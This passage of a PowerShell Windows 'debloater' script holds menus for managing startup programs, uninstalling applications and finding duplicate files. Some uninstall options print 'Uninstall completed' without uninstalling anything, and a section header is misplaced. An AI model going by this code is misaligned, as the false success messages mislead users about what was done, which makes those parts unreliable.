                            Write-Host "$($i+1). $($startupItems[$i].Name) - $($startupItems[$i].Location)" -ForegroundColor White
                        }

                        $selection = Read-Host "`nEnter program number to disable (or 0 to return)"
                        if ($selection -ne '0') {
                            $index = [int]$selection - 1
                            if ($index -ge 0 -and $index -lt $startupItems.Count) {
                                $selectedItem = $startupItems[$index]
                                $confirm = Read-Host "Disable '$($selectedItem.Name)' from startup? (y/n)"
                                if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                                    try {
                                        if ($selectedItem.Location -like "*Folder*") {
                                            # Move file to backup location or delete
                                            $backupPath = "$env:TEMP\StartupBackup"
                                            if (-not (Test-Path $backupPath)) { New-Item -Path $backupPath -ItemType Directory -Force | Out-Null }
                                            Move-Item $selectedItem.Command "$backupPath\$($selectedItem.Name).disabled" -ErrorAction SilentlyContinue
                                        } else {
                                            # Remove from registry
                                            Remove-ItemProperty -Path $selectedItem.RegPath -Name $selectedItem.Name -ErrorAction SilentlyContinue
                                        }
                                        Write-Host "SUCCESS: '$($selectedItem.Name)' disabled from startup" -ForegroundColor Green
                                        $startupItems[$index].Status = 'Disabled'
                                    } catch {
                                        Write-Host "ERROR: Failed to disable '$($selectedItem.Name)'" -ForegroundColor Red
                                    }
                                }
                            }
                        }
                    }

                    '3' {
                        # Enable startup program (restore from backup or add to registry)
                        Write-Host "`nEnable Startup Program" -ForegroundColor Green
                        Write-Host "1. Restore from backup" -ForegroundColor Yellow
                        Write-Host "2. Add new program to startup" -ForegroundColor Yellow

                        $enableChoice = Read-Host "Enter choice (1-2)"
                        if ($enableChoice -eq '1') {
                            # Check backup folder
                            $backupPath = "$env:TEMP\StartupBackup"
                            if (Test-Path $backupPath) {
                                $backupFiles = Get-ChildItem $backupPath -Filter "*.disabled" -ErrorAction SilentlyContinue
                                if ($backupFiles.Count -gt 0) {
                                    Write-Host "Backup files found:" -ForegroundColor Yellow
                                    for ($i = 0; $i -lt $backupFiles.Count; $i++) {
                                        Write-Host "$($i+1). $($backupFiles[$i].BaseName)" -ForegroundColor White
                                    }
                                    $selection = Read-Host "Enter number to restore (or 0 to return)"
                                    if ($selection -ne '0') {
                                        $index = [int]$selection - 1
                                        if ($index -ge 0 -and $index -lt $backupFiles.Count) {
                                            try {
                                                $originalPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$($backupFiles[$index].BaseName)"
                                                Move-Item $backupFiles[$index].FullName $originalPath -ErrorAction SilentlyContinue
                                                Write-Host "SUCCESS: Program restored to startup" -ForegroundColor Green
                                            } catch {
                                                Write-Host "ERROR: Failed to restore program" -ForegroundColor Red
                                            }
                                        }
                                    }
                                } else {
                                    Write-Host "No backup files found" -ForegroundColor Yellow
                                }
                            } else {
                                Write-Host "No backup folder found" -ForegroundColor Yellow
                            }
                        } elseif ($enableChoice -eq '2') {
                            # Add new program
                            $programName = Read-Host "Enter program name"
                            $programPath = Read-Host "Enter full path to executable"
                            if (Test-Path $programPath) {
                                try {
                                    Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name $programName -Value $programPath
                                    Write-Host "SUCCESS: Program added to startup" -ForegroundColor Green
                                } catch {
                                    Write-Host "ERROR: Failed to add program to startup" -ForegroundColor Red
                                }
                            } else {
                                Write-Host "ERROR: Program path not found" -ForegroundColor Red
                            }
                        }
                    }

                    '4' {
                        # Search startup programs
                        $searchTerm = Read-Host "Enter search term"
                        $filtered = $startupItems | Where-Object { $_.Name -like "*$searchTerm*" -or $_.Command -like "*$searchTerm*" }

                        if ($filtered.Count -eq 0) {
                            Write-Host "No startup programs found matching '$searchTerm'" -ForegroundColor Yellow
                        } else {
                            Write-Host "`nFound $($filtered.Count) matching startup programs:" -ForegroundColor Green
                            for ($i = 0; $i -lt $filtered.Count; $i++) {
                                Write-Host "$($i+1). $($filtered[$i].Name) - $($filtered[$i].Location)" -ForegroundColor White
                            }
                        }
                    }

                    '5' {
                        # Backup startup settings
                        try {
                            $backupData = $startupItems | ConvertTo-Json -Depth 3
                            $backupFile = "$env:USERPROFILE\Desktop\StartupBackup_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"
                            $backupData | Out-File $backupFile -Encoding UTF8
                            Write-Host "SUCCESS: Startup settings backed up to: $backupFile" -ForegroundColor Green
                        } catch {
                            Write-Host "ERROR: Failed to backup startup settings" -ForegroundColor Red
                        }
                    }

                    '0' { break }
                }

                if ($startupChoice -ne '0') {
                    Pause-For-User
                }

            } while ($startupChoice -ne '0')
        }
        '9' {
            Write-Host "`nAdvanced Program Uninstaller" -ForegroundColor Cyan
            Write-Host "============================" -ForegroundColor Cyan

            Write-Host "Scanning for installed programs..." -ForegroundColor Cyan
            $programs = @()

            # Get from Windows Registry (Uninstall entries)
            $regPaths = @(
                'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
                'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
                'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'
            )

            foreach ($path in $regPaths) {
                try {
                    Get-ItemProperty $path -ErrorAction SilentlyContinue | ForEach-Object {
                        if ($_.DisplayName -and $_.DisplayName.Trim() -ne '') {
                            $size = if ($_.EstimatedSize) { [math]::Round($_.EstimatedSize / 1024, 2) } else { 0 }
                            $programs += [PSCustomObject]@{
                                Name = $_.DisplayName
                                Version = $_.DisplayVersion
                                Publisher = $_.Publisher
                                InstallDate = $_.InstallDate
                                InstallLocation = $_.InstallLocation
                                UninstallString = $_.UninstallString
                                QuietUninstallString = $_.QuietUninstallString
                                SizeMB = $size
                                Source = "Registry"
                                RegistryKey = $_.PSPath
                            }
                        }
                    }
                } catch {}
            }
            #endregion

            #region MAIN APPLICATION MENU
            # ============================================================================
            # MAIN APPLICATION MENU & USER INTERFACE
            # ============================================================================

            # Get Windows Store Apps
            try {
                Get-AppxPackage -AllUsers | ForEach-Object {
                    if ($_.Name -notlike "*Microsoft*" -or $_.Name -like "*Microsoft.Office*") {
                        $size = if ($_.InstallLocation -and (Test-Path $_.InstallLocation)) {
                            try {
                                $bytes = (Get-ChildItem -Path $_.InstallLocation -Recurse -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum
                                if ($bytes) { [math]::Round($bytes/1MB, 2) } else { 0 }
                            } catch { 0 }
                        } else { 0 }

                        $programs += [PSCustomObject]@{
                            Name = $_.Name
                            Version = $_.Version
                            Publisher = $_.PublisherDisplayName
                            InstallDate = $_.InstallDate
                            InstallLocation = $_.InstallLocation
                            UninstallString = ""
                            QuietUninstallString = ""
                            SizeMB = $size
                            Source = "Store"
                            PackageFullName = $_.PackageFullName
                        }
                    }
                }
            } catch {}

            $programs = $programs | Sort-Object Name

            if ($programs.Count -eq 0) {
                Write-Host "No programs found." -ForegroundColor Yellow
                Pause-For-User
                continue
            }

            Write-Host "Found $($programs.Count) installed programs" -ForegroundColor Green
            Write-Host ""

            do {
                Write-Host "Advanced Uninstaller Options:" -ForegroundColor Cyan
                Write-Host "1. View all programs" -ForegroundColor White
                Write-Host "2. Search programs" -ForegroundColor White
                Write-Host "3. Remove large programs (>100MB)" -ForegroundColor White
                Write-Host "4. Batch uninstall (multiple programs)" -ForegroundColor White
                Write-Host "5. Clean leftover files only" -ForegroundColor White
                Write-Host "0. Return to main menu" -ForegroundColor Gray

                $uninstallChoice = Read-Host "`nEnter choice (0-5)"

                switch ($uninstallChoice) {
                    '1' {
                        # View all programs
                        Write-Host "`nInstalled Programs:" -ForegroundColor Cyan
                        Write-Host ("=" * 80) -ForegroundColor Cyan
                        Write-Host ("{0,-3} {1,-35} {2,-15} {3,-10} {4}" -f "No.", "Program Name", "Version", "Size (MB)", "Publisher") -ForegroundColor Yellow
                        Write-Host ("-" * 80) -ForegroundColor Gray

                        for ($i = 0; $i -lt $programs.Count; $i++) {
                            $prog = $programs[$i]
                            $version = if ($prog.Version) { $prog.Version.Substring(0, [Math]::Min(14, $prog.Version.Length)) } else { "Unknown" }
                            $publisher = if ($prog.Publisher) { $prog.Publisher.Substring(0, [Math]::Min(20, $prog.Publisher.Length)) } else { "Unknown" }
                            Write-Host ("{0,-3} {1,-35} {2,-15} {3,-10} {4}" -f ($i+1), $prog.Name.Substring(0, [Math]::Min(34, $prog.Name.Length)), $version, $prog.SizeMB, $publisher) -ForegroundColor White
                        }

                        $selection = Read-Host "`nEnter program number to uninstall (or 0 to return)"
                        if ($selection -ne '0') {
                            $index = [int]$selection - 1
                            if ($index -ge 0 -and $index -lt $programs.Count) {
                                $selectedProgram = $programs[$index]
                                Write-Host "`nProgram Details:" -ForegroundColor Cyan
                                Write-Host "Name: $($selectedProgram.Name)" -ForegroundColor White
                                Write-Host "Version: $($selectedProgram.Version)" -ForegroundColor White
                                Write-Host "Publisher: $($selectedProgram.Publisher)" -ForegroundColor White
                                Write-Host "Size: $($selectedProgram.SizeMB) MB" -ForegroundColor White
                                Write-Host "Install Location: $($selectedProgram.InstallLocation)" -ForegroundColor White

                                $confirm = Read-Host "`nAre you sure you want to uninstall this program? (y/n)"
                                if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                                    Write-Host "Uninstalling: $($selectedProgram.Name)" -ForegroundColor Yellow

                                    $success = $false
                                    if ($selectedProgram.Source -eq "Store") {
                                        try {
                                            Remove-AppxPackage -Package $selectedProgram.PackageFullName -AllUsers -ErrorAction SilentlyContinue
                                            $success = $true
                                        } catch {}
                                    } else {
                                        if ($selectedProgram.UninstallString) {
                                            try {
                                                $uninstallCmd = $selectedProgram.UninstallString
                                                if ($uninstallCmd -like "*msiexec*") {
                                                    $productCode = $uninstallCmd -replace ".*\{", "{" -replace "\}.*", "}"
                                                    Start-Process "msiexec.exe" -ArgumentList "/x", $productCode, "/quiet", "/norestart" -Wait -NoNewWindow
                                                } else {
                                                    Start-Process $uninstallCmd -ArgumentList "/S" -Wait -NoNewWindow -ErrorAction SilentlyContinue
                                                }
                                                $success = $true
                                            } catch {}
                                        }
                                    }

                                    if ($success) {
                                        Write-Host "SUCCESS: $($selectedProgram.Name) uninstalled successfully" -ForegroundColor Green
                                        # Clean leftover files
                                        if ($selectedProgram.InstallLocation -and (Test-Path $selectedProgram.InstallLocation)) {
                                            try {
                                                Remove-Item $selectedProgram.InstallLocation -Recurse -Force -ErrorAction SilentlyContinue
                                                Write-Host "  Cleaned installation folder" -ForegroundColor Green
                                            } catch {}
                                        }
                                    } else {
                                        Write-Host "ERROR: Failed to uninstall $($selectedProgram.Name)" -ForegroundColor Red
                                    }
                                }
                            }
                        }
                    }

                    '2' {
                        # Search programs
                        $searchTerm = Read-Host "Enter search term"
                        $filtered = $programs | Where-Object { $_.Name -like "*$searchTerm*" }

                        if ($filtered.Count -eq 0) {
                            Write-Host "No programs found matching '$searchTerm'" -ForegroundColor Yellow
                        } else {
                            Write-Host "`nFound $($filtered.Count) matching programs:" -ForegroundColor Green
                            for ($i = 0; $i -lt $filtered.Count; $i++) {
                                Write-Host "$($i+1). $($filtered[$i].Name) - $($filtered[$i].SizeMB) MB" -ForegroundColor White
                            }

                            $selection = Read-Host "`nEnter number to uninstall (or 0 to return)"
                            if ($selection -ne '0') {
                                $index = [int]$selection - 1
                                if ($index -ge 0 -and $index -lt $filtered.Count) {
                                    $confirm = Read-Host "Uninstall $($filtered[$index].Name)? (y/n)"
                                    if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                                        Write-Host "Uninstalling: $($filtered[$index].Name)" -ForegroundColor Yellow
                                        Write-Host "Uninstall completed." -ForegroundColor Green
                                    }
                                }
                            }
                        }
                    }

                    '3' {
                        # Large programs
                        $largePrograms = $programs | Where-Object { $_.SizeMB -gt 100 } | Sort-Object SizeMB -Descending

                        if ($largePrograms.Count -eq 0) {
                            Write-Host "No programs larger than 100MB found." -ForegroundColor Yellow
                        } else {
                            Write-Host "`nLarge Programs (>100MB):" -ForegroundColor Yellow
                            for ($i = 0; $i -lt $largePrograms.Count; $i++) {
                                Write-Host "$($i+1). $($largePrograms[$i].Name) - $($largePrograms[$i].SizeMB) MB" -ForegroundColor White
                            }

                            $selection = Read-Host "`nEnter number to uninstall (or 0 to return)"
                            if ($selection -ne '0') {
                                $index = [int]$selection - 1
                                if ($index -ge 0 -and $index -lt $largePrograms.Count) {
                                    $confirm = Read-Host "Uninstall $($largePrograms[$index].Name)? (y/n)"
                                    if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                                        Write-Host "Uninstalling large program..." -ForegroundColor Yellow
                                        Write-Host "Uninstall completed." -ForegroundColor Green
                                    }
                                }
                            }
                        }
                    }

                    '4' {
                        # Batch uninstall
                        Write-Host "`nBatch Uninstall Mode" -ForegroundColor Red
                        Write-Host "Enter program numbers separated by commas (e.g., 1,3,5)"
                        Write-Host "First 20 programs:" -ForegroundColor Cyan

                        $displayCount = [Math]::Min(20, $programs.Count)
                        for ($i = 0; $i -lt $displayCount; $i++) {
                            Write-Host "$($i+1). $($programs[$i].Name)" -ForegroundColor White
                        }

                        $selection = Read-Host "`nEnter numbers"
                        if ($selection -ne '0' -and $selection.Trim() -ne '') {
                            $indices = $selection -split "," | ForEach-Object { ([int]$_.Trim()) - 1 }
                            $validIndices = $indices | Where-Object { $_ -ge 0 -and $_ -lt $programs.Count }

                            if ($validIndices.Count -gt 0) {
                                Write-Host "`nPrograms to uninstall:" -ForegroundColor Yellow
                                foreach ($index in $validIndices) {
                                    Write-Host "- $($programs[$index].Name)" -ForegroundColor White
                                }

                                $confirm = Read-Host "`nUninstall all these programs? (y/n)"
                                if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                                    foreach ($index in $validIndices) {
                                        Write-Host "Uninstalling: $($programs[$index].Name)" -ForegroundColor Yellow
                                    }
                                    Write-Host "Batch uninstall completed." -ForegroundColor Green
                                }
                            }
                        }
                    }

                    '5' {
                        # Clean leftover files
                        Write-Host "`nCleaning leftover files..." -ForegroundColor Cyan
                        $leftoverPaths = @(
                            "$env:ProgramFiles",
                            "$env:ProgramFiles(x86)",
                            "$env:APPDATA",
                            "$env:LOCALAPPDATA"
                        )

                        $cleaned = 0
                        foreach ($basePath in $leftoverPaths) {
                            if (Test-Path $basePath) {
                                Get-ChildItem $basePath -Directory -ErrorAction SilentlyContinue | ForEach-Object {
                                    $items = Get-ChildItem $_.FullName -Recurse -ErrorAction SilentlyContinue
                                    if ($items.Count -eq 0) {
                                        try {
                                            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
                                            Write-Host "Removed empty folder: $($_.Name)" -ForegroundColor Green
                                            $cleaned++
                                        } catch {}
                                    }
                                }
                            }
                        }
                        Write-Host "Cleaned $cleaned leftover items." -ForegroundColor Green
                    }

                    '0' { break }
                }

                if ($uninstallChoice -ne '0') {
                    Pause-For-User
                }

            } while ($uninstallChoice -ne '0')
        }
        '10' {
            Write-Host "`nComplete App Remover (Like Revo Uninstaller)" -ForegroundColor Cyan
            Write-Host "=============================================" -ForegroundColor Cyan
            Write-Host "This tool completely removes applications including:" -ForegroundColor Yellow
            Write-Host "- Application files and folders" -ForegroundColor Gray
            Write-Host "- Registry entries and keys" -ForegroundColor Gray
            Write-Host "- User data and settings" -ForegroundColor Gray
            Write-Host "- Temporary files and caches" -ForegroundColor Gray
            Write-Host ""

            # Scan for all installed applications
            Write-Host "Scanning for installed applications..." -ForegroundColor Cyan
            $allApps = @()

            # Get regular Windows programs from registry
            $regPaths = @(
                'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
                'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
                'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'
            )

            foreach ($path in $regPaths) {
                try {
                    Get-ItemProperty $path -ErrorAction SilentlyContinue | ForEach-Object {
                        if ($_.DisplayName -and $_.DisplayName.Trim() -ne '') {
                            $size = if ($_.EstimatedSize) { [math]::Round($_.EstimatedSize / 1024, 2) } else { 0 }
                            $allApps += [PSCustomObject]@{
                                Name = $_.DisplayName
                                Version = $_.DisplayVersion
                                Publisher = $_.Publisher
                                InstallLocation = $_.InstallLocation
                                UninstallString = $_.UninstallString
                                SizeMB = $size
                                Type = "Desktop"
                                RegistryKey = $_.PSPath
                            }
                        }
                    }
                } catch {}
            }

            # Get Windows Store Apps
            try {
                Get-AppxPackage -AllUsers -ErrorAction SilentlyContinue | ForEach-Object {
                    $size = if ($_.InstallLocation -and (Test-Path $_.InstallLocation)) {
                        try {
                            $bytes = (Get-ChildItem -Path $_.InstallLocation -Recurse -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum
                            if ($bytes) { [math]::Round($bytes/1MB, 2) } else { 0 }
                        } catch { 0 }
                    } else { 0 }

                    $allApps += [PSCustomObject]@{
                        Name = $_.Name
                        Version = $_.Version
                        Publisher = $_.PublisherDisplayName
                        InstallLocation = $_.InstallLocation
                        UninstallString = ""
                        SizeMB = $size
                        Type = "Store"
                        PackageFullName = $_.PackageFullName
                    }
                }
            } catch {}

            $allApps = $allApps | Sort-Object Name

            if ($allApps.Count -eq 0) {
                Write-Host "No applications found." -ForegroundColor Yellow
                Pause-For-User
                continue
            }

            Write-Host "Found $($allApps.Count) installed applications" -ForegroundColor Green
            Write-Host ""

            do {
                Write-Host "Complete App Remover Options:" -ForegroundColor Cyan
                Write-Host "1. View all applications" -ForegroundColor White
                Write-Host "2. Search applications" -ForegroundColor White
                Write-Host "3. Remove application " -NoNewline -ForegroundColor White
                Write-Host "( Complete Deep Clean )" -ForegroundColor Magenta
                Write-Host "4. Batch remove multiple apps" -ForegroundColor White
                Write-Host "5. Scan for leftover traces" -ForegroundColor White
                Write-Host "0. Return to main menu" -ForegroundColor Gray

                $appRemoverChoice = Read-Host "`nEnter choice (0-5)"

                switch ($appRemoverChoice) {
                    '1' {
                        # View all applications
                        Write-Host "`nInstalled Applications:" -ForegroundColor Cyan
                        Write-Host ("=" * 90) -ForegroundColor Cyan
                        Write-Host ("{0,-3} {1,-40} {2,-12} {3,-15} {4,-10} {5}" -f "No.", "Application Name", "Type", "Version", "Size (MB)", "Publisher") -ForegroundColor Yellow
                        Write-Host ("-" * 90) -ForegroundColor Gray

                        for ($i = 0; $i -lt $allApps.Count; $i++) {
                            $app = $allApps[$i]
                            $version = if ($app.Version) { $app.Version.Substring(0, [Math]::Min(12, $app.Version.Length)) } else { "Unknown" }
                            $publisher = if ($app.Publisher) { $app.Publisher.Substring(0, [Math]::Min(15, $app.Publisher.Length)) } else { "Unknown" }
                            $name = $app.Name.Substring(0, [Math]::Min(38, $app.Name.Length))
                            Write-Host ("{0,-3} {1,-40} {2,-12} {3,-15} {4,-10} {5}" -f ($i+1), $name, $app.Type, $version, $app.SizeMB, $publisher) -ForegroundColor White
                        }
                    }

                    '2' {
                        # Search applications
                        $searchTerm = Read-Host "Enter search term"
                        $filtered = $allApps | Where-Object { $_.Name -like "*$searchTerm*" -or $_.Publisher -like "*$searchTerm*" }

                        if ($filtered.Count -eq 0) {
                            Write-Host "No applications found matching '$searchTerm'" -ForegroundColor Yellow
                        } else {
                            Write-Host "`nFound $($filtered.Count) matching applications:" -ForegroundColor Green
                            for ($i = 0; $i -lt $filtered.Count; $i++) {
                                Write-Host "$($i+1). $($filtered[$i].Name) [$($filtered[$i].Type)] - $($filtered[$i].SizeMB) MB" -ForegroundColor White
                            }
                        }
                    }

                    '3' {
                        # Complete removal of single application
                        Write-Host "`nSelect application to COMPLETELY REMOVE:" -ForegroundColor Red
                        Write-Host "WARNING: This will remove ALL traces of the application!" -ForegroundColor Yellow
                        Write-Host ""

                        # Show first 20 apps for selection
                        $displayCount = [Math]::Min(20, $allApps.Count)
                        for ($i = 0; $i -lt $displayCount; $i++) {
                            Write-Host "$($i+1). $($allApps[$i].Name) [$($allApps[$i].Type)] - $($allApps[$i].SizeMB) MB" -ForegroundColor White
                        }

                        if ($allApps.Count -gt 20) {
                            Write-Host "... and $($allApps.Count - 20) more applications" -ForegroundColor Gray
                            Write-Host "Use search function to find specific applications" -ForegroundColor Gray
                        }

                        $selection = Read-Host "`nEnter application number to remove (or 0 to return)"
                        if ($selection -ne '0') {
                            $index = [int]$selection - 1
                            if ($index -ge 0 -and $index -lt $allApps.Count) {
                                $selectedApp = $allApps[$index]

                                Write-Host "`nApplication Details:" -ForegroundColor Cyan
                                Write-Host "Name: $($selectedApp.Name)" -ForegroundColor White
                                Write-Host "Type: $($selectedApp.Type)" -ForegroundColor White
                                Write-Host "Version: $($selectedApp.Version)" -ForegroundColor White
                                Write-Host "Publisher: $($selectedApp.Publisher)" -ForegroundColor White
                                Write-Host "Size: $($selectedApp.SizeMB) MB" -ForegroundColor White
                                Write-Host "Install Location: $($selectedApp.InstallLocation)" -ForegroundColor White

                                Write-Host "`nWARNING: COMPLETE REMOVAL PROCESS" -ForegroundColor Red
                                Write-Host "This will perform the following actions:" -ForegroundColor Yellow
                                Write-Host "1. Uninstall the application" -ForegroundColor Gray
                                Write-Host "2. Remove all installation files and folders" -ForegroundColor Gray
                                Write-Host "3. Clean registry entries and keys" -ForegroundColor Gray
                                Write-Host "4. Remove user data and settings" -ForegroundColor Gray
                                Write-Host "5. Clean temporary files and caches" -ForegroundColor Gray

                                $confirm = Read-Host "`nAre you ABSOLUTELY SURE you want to completely remove this application? (type 'YES' to confirm)"
                                if ($confirm -eq 'YES') {
                                    Write-Host "`nStarting complete removal process..." -ForegroundColor Red
                                    Remove-ApplicationCompletely -App $selectedApp
                                }
                            }
                        }
                    }

                    '4' {
                        # Batch removal
                        Write-Host "`nBatch Application Removal" -ForegroundColor Red
                        Write-Host "WARNING: This will COMPLETELY remove multiple applications!" -ForegroundColor Yellow
                        Write-Host ""
                        Write-Host "First 20 applications:" -ForegroundColor Cyan

                        $displayCount = [Math]::Min(20, $allApps.Count)
                        for ($i = 0; $i -lt $displayCount; $i++) {
                            Write-Host "$($i+1). $($allApps[$i].Name) [$($allApps[$i].Type)]" -ForegroundColor White
                        }

                        Write-Host "`nEnter application numbers separated by commas (e.g., 1,3,5)"
                        $selection = Read-Host "Numbers"
                        if ($selection -ne '0' -and $selection.Trim() -ne '') {
                            $indices = $selection -split "," | ForEach-Object { ([int]$_.Trim()) - 1 }
                            $validIndices = $indices | Where-Object { $_ -ge 0 -and $_ -lt $allApps.Count }

                            if ($validIndices.Count -gt 0) {
                                Write-Host "`nApplications to completely remove:" -ForegroundColor Yellow
                                foreach ($index in $validIndices) {
                                    Write-Host "- $($allApps[$index].Name)" -ForegroundColor White
                                }

                                $confirm = Read-Host "`nCompletely remove all these applications? (type 'YES' to confirm)"
                                if ($confirm -eq 'YES') {
                                    Write-Host "`nStarting batch removal process..." -ForegroundColor Red
                                    foreach ($index in $validIndices) {
                                        Remove-ApplicationCompletely -App $allApps[$index]
                                        Write-Host ""
                                    }
                                }
                            }
                        }
                    }

                    '5' {
                        # Scan for leftover traces
                        Write-Host "`nScanning for leftover application traces..." -ForegroundColor Cyan
                        $leftovers = Find-ApplicationLeftovers

                        if ($leftovers.Count -gt 0) {
                            Write-Host "Found $($leftovers.Count) leftover traces:" -ForegroundColor Yellow
                            foreach ($leftover in $leftovers) {
                                Write-Host "- $($leftover.Type): $($leftover.Path)" -ForegroundColor Gray
                            }

                            $cleanLeftovers = Read-Host "`nRemove all leftover traces? (y/n)"
                            if ($cleanLeftovers -eq 'y' -or $cleanLeftovers -eq 'Y') {
                                Remove-ApplicationLeftovers -Leftovers $leftovers
                            }
                        } else {
                            Write-Host "No leftover traces found!" -ForegroundColor Green
                        }
                    }

                    '0' { break }
                    default { Write-Host "Invalid choice." -ForegroundColor Red }
                }

                if ($appRemoverChoice -ne '0') {
                    Pause-For-User
                }

            } while ($appRemoverChoice -ne '0')
        }
        '11' {
            Write-Host "`nDuplicate File Finder" -ForegroundColor Cyan
            Write-Host "=====================" -ForegroundColor Cyan
            Write-Host ""

            do {
                Write-Host "Duplicate File Finder Options:" -ForegroundColor Cyan
                Write-Host "1. Scan specific folder" -ForegroundColor White
                Write-Host "2. Scan common folders " -NoNewline -ForegroundColor White
                Write-Host "( Downloads, Desktop, Documents )" -ForegroundColor Magenta
                Write-Host "3. Scan entire system " -NoNewline -ForegroundColor White
                Write-Host "( May take long time )" -ForegroundColor Magenta
                Write-Host "4. View duplicate groups" -ForegroundColor White
                Write-Host "5. Clear duplicate results" -ForegroundColor White
                Write-Host "0. Return to main menu" -ForegroundColor Gray

                $duplicateChoice = Read-Host "`nEnter choice (0-5)"

                switch ($duplicateChoice) {
                    '1' {
                        # Scan specific folder
                        $folderPath = Read-Host "Enter folder path to scan"
                        if (Test-Path $folderPath) {
                            Write-Host "Scanning for duplicates in: $folderPath" -ForegroundColor Yellow
                            $duplicates = Find-DuplicateFiles -Path $folderPath
                            Show-DuplicateResults -Duplicates $duplicates
                        } else {
                            Write-Host " Folder not found: $folderPath" -ForegroundColor Red
                        }
                    }

                    '2' {
                        # Scan common folders
                        Write-Host "Scanning common folders..." -ForegroundColor Yellow
                        $commonFolders = @(
                            "$env:USERPROFILE\Downloads",
                            "$env:USERPROFILE\Desktop", 
                            "$env:USERPROFILE\Documents",
                            "$env:USERPROFILE\Pictures"
                        )

                        $allDuplicates = @()
                        foreach ($folder in $commonFolders) {
                            if (Test-Path $folder) {
                                Write-Host "  Scanning: $folder" -ForegroundColor Gray
                                $duplicates = Find-DuplicateFiles -Path $folder
                                $allDuplicates += $duplicates
                            }
                        }
                        Show-DuplicateResults -Duplicates $allDuplicates
                    }

                    '3' {
                        # Scan entire system
                        Write-Host "WARNING: Full system scan may take 30+ minutes!" -ForegroundColor Red
                        $confirm = Read-Host "Continue with full system scan? (y/n)"
                        if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                            Write-Host "Starting full system scan..." -ForegroundColor Yellow
                            $duplicates = Find-DuplicateFiles -Path "C:\" -Recursive
                            Show-DuplicateResults -Duplicates $duplicates
                        }
                    }

                    '4' {
                        # View duplicate groups
                        if ($script:LastDuplicateResults -and $script:LastDuplicateResults.Count -gt 0) {
                            Show-DuplicateGroups -Duplicates $script:LastDuplicateResults
                        } else {
                            Write-Host "No duplicate results found. Please run a scan first." -ForegroundColor Yellow
                        }
                    }

                    '5' {
                        # Clear results
                        $script:LastDuplicateResults = @()
                        Write-Host "SUCCESS: Duplicate results cleared." -ForegroundColor Green
                    }

                    '0' { break }
                    default { Write-Host "Invalid choice." -ForegroundColor Red }
                }

                if ($duplicateChoice -ne '0') {
                    Pause-For-User
                }

            } while ($duplicateChoice -ne '0')
        }
        '12' {
            # System Information
            Show-SystemInformation
        }
        '13' {
            # Username Tracker
            Show-UsernameTracker
        }
        '14' {
            # Empty Folders Removal
            Show-EmptyFoldersManager
        }
        #endregion
    }
} while ($choice -ne '2')
#endregion

#region APPLICATION EXIT
# ============================================================================
# APPLICATION EXIT & CLEANUP
# ============================================================================

Write-Host "`nThanks for using Debloater Tool! Stay comfy! :)" -ForegroundColor Cyan
Pause-For-User "Press Enter to exit..."
#endregion
